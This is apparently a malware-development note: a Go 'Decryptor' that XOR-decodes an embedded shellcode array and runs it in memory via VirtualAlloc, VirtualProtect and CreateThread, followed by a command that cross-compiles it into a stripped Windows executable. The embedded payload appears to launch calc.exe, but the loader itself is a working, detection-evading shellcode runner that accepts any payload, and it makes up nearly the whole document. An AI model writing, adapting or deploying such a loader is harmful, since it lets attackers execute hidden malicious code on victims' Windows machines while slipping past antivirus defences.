## Decryptor

```go
package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	secretKey := byte(133)

	// Put encrypted byte from prepare here
	encryptedShellcode := []byte{121, 205, 6, 97, 117, 109, 69, 133, 133, 133, 196, 212, 196, 213, 215, 212, 211, 205, 180, 87, 224, 205, 14, 215, 229, 205, 14, 215, 157, 205, 14, 215, 165, 205, 14, 247, 213, 205, 138, 50, 207, 207, 200, 180, 76, 205, 180, 69, 41, 185, 228, 249, 135, 169, 165, 196, 68, 76, 136, 196, 132, 68, 103, 104, 215, 196, 212, 205, 14, 215, 165, 14, 199, 185, 205, 132, 85, 14, 5, 13, 133, 133, 133, 205, 0, 69, 241, 226, 205, 132, 85, 213, 14, 205, 157, 193, 14, 197, 165, 204, 132, 85, 102, 211, 205, 122, 76, 196, 14, 177, 13, 205, 132, 83, 200, 180, 76, 205, 180, 69, 41, 196, 68, 76, 136, 196, 132, 68, 189, 101, 240, 116, 201, 134, 201, 161, 141, 192, 188, 84, 240, 93, 221, 193, 14, 197, 161, 204, 132, 85, 227, 196, 14, 137, 205, 193, 14, 197, 153, 204, 132, 85, 196, 14, 129, 13, 205, 132, 85, 196, 221, 196, 221, 219, 220, 223, 196, 221, 196, 220, 196, 223, 205, 6, 105, 165, 196, 215, 122, 101, 221, 196, 220, 223, 205, 14, 151, 108, 210, 122, 122, 122, 216, 205, 63, 132, 133, 133, 133, 133, 133, 133, 133, 205, 8, 8, 132, 132, 133, 133, 196, 63, 180, 14, 234, 2, 122, 80, 62, 117, 48, 39, 211, 196, 63, 35, 16, 56, 24, 122, 80, 205, 6, 65, 173, 185, 131, 249, 143, 5, 126, 101, 240, 128, 62, 194, 150, 247, 234, 239, 133, 220, 196, 12, 95, 122, 80, 230, 228, 233, 230, 171, 224, 253, 224, 133}

	var clearShellcode []byte

	for i := 0; i < len(encryptedShellcode); i++ {
		clearShellcode = append(clearShellcode, encryptedShellcode[i]^secretKey)
	}

	// Allocating memory
	fmt.Println("Allocating Memory")
	pNewlyAllocatedMem, err := windows.VirtualAlloc(uintptr(0), uintptr(len(clearShellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		fmt.Println("Failed to Allocate Memory")
		fmt.Println(err.Error())
	}
	fmt.Println("Done ...")

	// Copying Shellcode
	fmt.Println("Copying Shellcode")
	destination := unsafe.Slice((*byte)(unsafe.Pointer(pNewlyAllocatedMem)), len(clearShellcode))
	copy(destination, clearShellcode)
	fmt.Println("Done ...")

	fmt.Println("Changing Protection")
	var oldprotect uint32
	windows.VirtualProtect(pNewlyAllocatedMem, uintptr(len(clearShellcode)), windows.PAGE_EXECUTE_READ, &oldprotect)
	if err != nil {
		fmt.Println("Failed to Change Protection")
		fmt.Println(err.Error())
	}
	fmt.Println("Done ...")

	// Launching Thread
	fmt.Println("Launching thread")
	KERNEL32DLL := windows.NewLazyDLL("kernel32.dll")
	procCreateThread := KERNEL32DLL.NewProc("CreateThread")
	h, _, err := procCreateThread.Call(0, 0, pNewlyAllocatedMem, 0, 0, 0)
	if err != nil {
		fmt.Println("Failed to run thread")
		fmt.Println(err.Error())
	}
	fmt.Println("Done ...")

	windows.WaitForSingleObject(windows.Handle(h), windows.INFINITE)
}

```

---

## Cross Compilation

```bash
kant@APPLEs-MacBook-Pro ~/e/loader> GOOS=windows GOARCH=amd64 go build -a -ldflags="-s -w" -trimpath exp/main.go
kant@APPLEs-MacBook-Pro ~/e/loader> ls
exp/      go.mod    go.sum    main.exe*
```

---
